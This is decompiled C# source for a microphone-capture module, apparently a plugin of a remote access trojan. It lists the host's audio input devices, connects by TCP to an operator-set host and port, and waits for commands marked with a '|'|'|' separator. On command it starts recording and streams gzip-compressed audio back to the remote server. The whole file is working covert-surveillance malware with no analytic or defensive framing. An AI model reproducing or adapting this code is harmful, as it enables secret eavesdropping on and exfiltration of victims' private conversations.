using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using WinMM;

namespace Mic
{
	// Token: 0x02000002 RID: 2
	public class A
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002048 File Offset: 0x00000248
		public A()
		{
			this.OFF = false;
			this.Y = "|'|'|";
			this.C = new TcpClient();
			this.OSK = "";
			Control.CheckForIllegalCrossThreadCalls = false;
		}

		// Token: 0x06000002 RID: 2 RVA: 0x00002080 File Offset: 0x00000280
		public byte[] ZIP(byte[] B, ref bool CM)
		{
			checked
			{
				if (CM)
				{
					MemoryStream memoryStream = new MemoryStream();
					GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress, true);
					gzipStream.Write(B, 0, B.Length);
					gzipStream.Dispose();
					memoryStream.Position = 0L;
					byte[] array = new byte[(int)memoryStream.Length + 1];
					memoryStream.Read(array, 0, array.Length);
					memoryStream.Dispose();
					return array;
				}
				MemoryStream memoryStream2 = new MemoryStream(B);
				GZipStream gzipStream2 = new GZipStream(memoryStream2, CompressionMode.Decompress);
				byte[] array2 = new byte[4];
				memoryStream2.Position = memoryStream2.Length - 5L;
				memoryStream2.Read(array2, 0, 4);
				int num = BitConverter.ToInt32(array2, 0);
				memoryStream2.Position = 0L;
				byte[] array3 = new byte[num - 1 + 1];
				gzipStream2.Read(array3, 0, num);
				gzipStream2.Dispose();
				memoryStream2.Dispose();
				return array3;
			}
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002150 File Offset: 0x00000350
		public byte[] SB(ref string S)
		{
			return Encoding.Default.GetBytes(S);
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002160 File Offset: 0x00000360
		public string BS(ref byte[] B)
		{
			return Encoding.Default.GetString(B);
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002170 File Offset: 0x00000370
		public string ENB(ref string s)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			return Convert.ToBase64String(bytes);
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002198 File Offset: 0x00000398
		public string DEB(ref string s)
		{
			byte[] array = Convert.FromBase64String(s);
			return Encoding.UTF8.GetString(array);
		}

		// Token: 0x06000007 RID: 7 RVA: 0x000021C0 File Offset: 0x000003C0
		public void ind(byte[] b)
		{
			string[] array = Strings.Split(this.BS(ref b), this.Y, -1, CompareMethod.Binary);
			try
			{
				string text = array[0];
				if (Operators.CompareString(text, "~", false) == 0)
				{
					lock (this)
					{
						if (this.MC != null)
						{
							this.MC.Dispose();
							this.MC = null;
						}
						if (Conversions.ToInteger(array[1]) != -1)
						{
							this.MC = new Mrecorder(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]), Conversions.ToInteger(array[3]));
						}
					}
				}
			}
			catch (Exception ex)
			{
				this.Send(string.Concat(new string[]
				{
					"MIC",
					this.Y,
					this.OSK,
					this.Y,
					"ER",
					this.Y,
					array[0],
					this.Y,
					ex.Message
				}));
				if (this.MC != null)
				{
					this.MC.Dispose();
					this.MC = null;
				}
			}
		}

		// Token: 0x06000008 RID: 8 RVA: 0x0000231C File Offset: 0x0000051C
		public void Send(byte[] b)
		{
			try
			{
				TcpClient c = this.C;
				lock (c)
				{
					MemoryStream memoryStream = new MemoryStream();
					string text = Conversions.ToString(b.Length) + "\0";
					byte[] array = this.SB(ref text);
					memoryStream.Write(array, 0, array.Length);
					memoryStream.Write(b, 0, b.Length);
					this.C.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
					memoryStream.Dispose();
				}
			}
			catch (Exception ex)
			{
				this.OFF = true;
			}
		}

		// Token: 0x06000009 RID: 9 RVA: 0x000023DC File Offset: 0x000005DC
		public void Send(string S)
		{
			this.Send(this.SB(ref S));
		}

		// Token: 0x0600000A RID: 10 RVA: 0x000023EC File Offset: 0x000005EC
		public string[] GetDiv()
		{
			List<string> list = new List<string>();
			try
			{
				try
				{
					foreach (WaveInDeviceCaps waveInDeviceCaps in WaveIn.Devices)
					{
						list.Add(waveInDeviceCaps.Name);
					}
				}
				finally
				{
					
				}
			}
			catch (Exception ex)
			{
			}
			if (list.Count > 0)
			{
				list.RemoveAt(checked(list.Count - 1));
			}
			return list.ToArray();
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00002490 File Offset: 0x00000690
		public void Start()
		{
			if (this.GetDiv().Length == 0)
			{
				return;
			}
			Thread thread = new Thread(new ThreadStart(this.RC));
			thread.Start();
			thread = new Thread(new ThreadStart(this.doEvents));
			thread.Start();
			thread = new Thread(new ThreadStart(this.Sender), 1);
			thread.Start();
		}

		// Token: 0x0600000C RID: 12 RVA: 0x000024FC File Offset: 0x000006FC
		public void Sender()
		{
			while (!this.OFF)
			{
				if (this.MC != null)
				{
					try
					{
						byte[] bf = this.MC.GETBF();
						if (bf != null)
						{
							MemoryStream memoryStream = new MemoryStream();
							string text = string.Concat(new string[]
							{
								"MIC",
								this.Y,
								this.OSK,
								this.Y,
								"!",
								this.Y,
								this.MC.Q.ToString(),
								this.Y
							});
							byte[] array = this.SB(ref text);
							memoryStream.Write(array, 0, array.Length);
							byte[] array2 = bf;
							bool flag = true;
							array = this.ZIP(array2, ref flag);
							if (array.Length > bf.Length)
							{
								array = bf;
							}
							memoryStream.Write(array, 0, array.Length);
							this.C.Client.SendBufferSize = checked((int)(memoryStream.Length * 2L));
							this.C.Client.Poll(-1, SelectMode.SelectWrite);
							this.Send(memoryStream.ToArray());
						}
					}
					catch (Exception ex)
					{
						if (this.MC != null)
						{
							this.MC.Dispose();
						}
					}
				}
				Thread.Sleep(1);
			}
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002658 File Offset: 0x00000858
		public void doEvents()
		{
			while (!this.OFF)
			{
				Application.DoEvents();
				Thread.Sleep(100);
			}
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00002674 File Offset: 0x00000874
		public void RC()
		{
			MemoryStream memoryStream = new MemoryStream();
			this.C.Client.SendTimeout = -1;
			this.C.Client.ReceiveTimeout = -1;
			this.C.Client.SendBufferSize = 102400;
			byte[] array = new byte[1];
			long num = -1L;
			checked
			{
				try
				{
					this.C.Connect(this.H, this.P);
					string text = string.Concat(new string[] { "MIC", this.Y, this.OSK, this.Y, "~" });
					foreach (string text2 in this.GetDiv())
					{
						text = text + this.Y + text2;
					}
					this.Send(text);
					IL_DF:
					while (!this.OFF)
					{
						this.C.Client.Poll(-1, SelectMode.SelectRead);
						while (this.C.Available != 0)
						{
							if (num == -1L)
							{
								string text3 = "";
								for (;;)
								{
									int num2 = this.C.GetStream().ReadByte();
									if (num2 == -1)
									{
										goto Block_11;
									}
									if (num2 == 0)
									{
										break;
									}
									text3 += Conversions.ToString(Strings.ChrW(num2));
								}
								num = Conversions.ToLong(text3);
								if (num == 0L)
								{
									this.Send("");
									num = -1L;
								}
								if (this.C.Available > 0)
								{
									continue;
								}
								goto IL_DF;
								Block_11:
								break;
							}
							array = new byte[this.C.Available + 1];
							long num3 = num - memoryStream.Length;
							if (unchecked((long)array.Length) > num3)
							{
								array = new byte[(int)(num3 - 1L) + 1];
							}
							int num4 = this.C.Client.Receive(array, 0, array.Length, SocketFlags.None);
							memoryStream.Write(array, 0, num4);
							if (memoryStream.Length == num)
							{
								num = -1L;
								Thread thread = new Thread(delegate(object a0)
								{
									this.ind((byte[])a0);
								}, 1);
								thread.Start(memoryStream.ToArray());
								thread.Join(100);
								memoryStream.Dispose();
								memoryStream = new MemoryStream();
							}
							Thread.Sleep(1);
							goto IL_DF;
						}
						break;
					}
				}
				catch (Exception ex)
				{
				}
				this.OFF = true;
				try
				{
					this.C.Client.Disconnect(false);
				}
				catch (Exception ex2)
				{
				}
				try
				{
					this.C.Close();
				}
				catch (Exception ex3)
				{
				}
				try
				{
					memoryStream.Dispose();
				}
				catch (Exception ex4)
				{
				}
				if (this.MC != null)
				{
					this.MC.Dispose();
				}
			}
		}

		// Token: 0x04000001 RID: 1
		public Mrecorder MC;

		// Token: 0x04000002 RID: 2
		public string H;

		// Token: 0x04000003 RID: 3
		public int P;

		// Token: 0x04000004 RID: 4
		public bool OFF;

		// Token: 0x04000005 RID: 5
		public string Y;

		// Token: 0x04000006 RID: 6
		public TcpClient C;

		// Token: 0x04000007 RID: 7
		public string OSK;
	}
}
